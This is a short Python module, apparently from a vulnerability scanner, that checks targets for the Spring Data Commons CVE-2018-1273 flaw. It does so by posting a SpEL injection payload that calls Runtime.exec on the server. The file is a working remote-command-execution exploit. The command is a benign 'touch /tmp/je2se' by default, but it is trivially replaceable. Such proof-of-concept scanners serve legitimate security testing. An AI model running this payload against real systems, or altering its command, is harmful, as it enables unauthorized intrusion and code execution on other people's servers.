# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  Spring_CVE_2018_1273.py
@Desc:
'''
import requests
from lib import *
from lib.Urldeal import umethod
import logging

cmd = "touch /tmp/je2se"
headers = {
    'Host': "localhost:8080",
    'Connection': "keep-alive",
    'Content-Length': "120",
    'Pragma': "no-cache",
    'Cache-Control': "no-cache",
    'Origin': "http://localhost:8080",
    'Upgrade-Insecure-Requests': "1",
    'Content-Type': "application/x-www-form-urlencoded",
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    'Referer': "http://localhost:8080/users?page=0&size=5",
    'Accept-Encoding': "gzip, deflate, br",
    'Accept-Language': "zh-CN,zh;q=0.9,en;q=0.8"
    }
payload = "username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('%s')]=&password=&repeatedPassword=" % cmd
def Spring_CVE_2018_1273(Url):
    scheme, url, port = umethod(Url)
    payload_url = scheme + "://" + url + ":" + str(port) + "/users"
    try:
        r = requests.post(payload_url, data=payload, headers=headers)
        if r.status_code == 500:
            print(Vcolors.RED +"[!] 存在Spring远程命令执行漏洞:->Spring_CVE_2018_1273\r" + Vcolors.ENDC)
    except:
        logging.error("Spring_CVE_2018_1273脚本出现异常")